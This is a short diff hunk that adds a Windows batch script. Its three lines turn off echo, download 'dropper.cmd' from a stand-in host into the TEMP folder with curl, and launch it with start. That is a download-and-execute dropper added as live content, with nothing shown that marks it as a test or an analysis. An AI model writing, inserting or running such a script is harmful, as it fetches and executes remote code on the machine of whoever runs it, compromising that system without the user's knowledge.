@@ -1,0 +1,3 @@
+@echo off
+curl -o %TEMP%\o.bat http://one-3.example.test/dropper.cmd
+start %TEMP%\o.bat
